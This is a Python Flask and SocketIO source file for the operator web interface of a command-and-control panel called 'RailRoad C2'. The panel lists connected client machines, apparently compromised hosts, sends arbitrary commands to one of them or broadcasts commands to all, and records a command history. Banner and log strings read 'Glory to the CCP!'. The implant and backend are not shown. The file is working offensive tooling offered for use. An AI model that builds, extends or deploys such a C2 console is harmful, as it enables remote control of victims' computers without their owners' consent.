from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import threading
import time
from datetime import datetime
import json
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Import the backend server
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'backend'))

app = Flask(__name__)
app.config['SECRET_KEY'] = 'railroad_c2_secret_key_ccp'
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins="*")

# Store command history and results
command_history = []

# Global reference to socket server
socket_server = None

def frontend_callback(event_type, data):
    """Callback to send events to frontend via SocketIO"""
    try:
        if event_type == 'client_connected':
            socketio.emit('client_connected', {
                'client_id': data['client_id'],
                'client_info': data['client_info']
            })
            logger.info(f"Client connected: {data['client_id']}")
        
        elif event_type == 'client_disconnected':
            socketio.emit('client_disconnected', {
                'client_id': data['client_id']
            })
            logger.info(f"Client disconnected: {data['client_id']}")
        
        elif event_type == 'command_sent':
            socketio.emit('command_sent', {
                'client_id': data['client_id'],
                'command': data['command'],
                'timestamp': data['timestamp']
            })
    
    except Exception as e:
        logger.error(f"Error in frontend callback: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients')
def get_clients():
    if socket_server:
        clients = socket_server.client_manager.get_clients()
        return jsonify(clients)
    return jsonify({})

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id', 'broadcast')
    command = data.get('command', '')
    
    if not command:
        return jsonify({'error': 'No command provided'}), 400
    
    if not socket_server:
        return jsonify({'error': 'Socket server not available'}), 500
    
    # Record command in history
    cmd_entry = {
        'id': len(command_history) + 1,
        'client_id': client_id,
        'command': command,
        'timestamp': datetime.now().isoformat(),
        'type': 'single' if client_id != 'broadcast' else 'broadcast'
    }
    command_history.append(cmd_entry)
    
    # Send command to client(s)
    if client_id != 'broadcast':
        success = socket_server.client_manager.send_command(client_id, command)
        if success:
            socketio.emit('command_executed', cmd_entry)
            return jsonify({'message': f'Command sent to {client_id}'})
        else:
            return jsonify({'error': f'Failed to send command to {client_id}'}), 400
    else:
        # Broadcast to all clients
        results = socket_server.client_manager.broadcast_command(command)
        socketio.emit('command_broadcast', cmd_entry)
        return jsonify({
            'message': f'Command broadcast to {sum(results.values())} clients',
            'results': results
        })

@app.route('/api/history')
def get_history():
    return jsonify(command_history)

@app.route('/api/server/status')
def server_status():
    if socket_server and socket_server.running:
        clients = socket_server.client_manager.get_clients()
        return jsonify({
            'status': 'running',
            'clients_count': len(clients),
            'port': socket_server.port
        })
    return jsonify({'status': 'stopped'})

@socketio.on('connect')
def handle_connect():
    logger.info('Frontend client connected')
    emit('status', {'message': 'Connected to RailRoad C2 - Glory to the CCP!'})
    
    # Send current client list
    if socket_server:
        clients = socket_server.client_manager.get_clients()
        emit('clients_update', clients)

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Frontend client disconnected')

def background_client_updater():
    """Background thread to update client list periodically"""
    while True:
        try:
            if socket_server:
                clients = socket_server.client_manager.get_clients()
                socketio.emit('clients_update', clients)
        except Exception as e:
            logger.error(f"Error in background updater: {e}")
        time.sleep(3)

def start_backend_server():
    """Start the socket server in a separate thread"""
    global socket_server
    from server import SocketServer, start_socket_server
    
    socket_server = SocketServer()
    socket_server.add_frontend_callback(frontend_callback)
    
    logger.info("Starting backend socket server...")
    start_socket_server()

if __name__ == '__main__':
    # Start backend server in separate thread
    backend_thread = threading.Thread(target=start_backend_server)
    backend_thread.daemon = True
    backend_thread.start()
    
    # Start background thread for client updates
    updater_thread = threading.Thread(target=background_client_updater)
    updater_thread.daemon = True
    updater_thread.start()
    
    # Start the web interface
    logger.info("Starting RailRoad C2 Web Interface on http://0.0.0.0:5000")
    logger.info("Glory to the CCP!")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)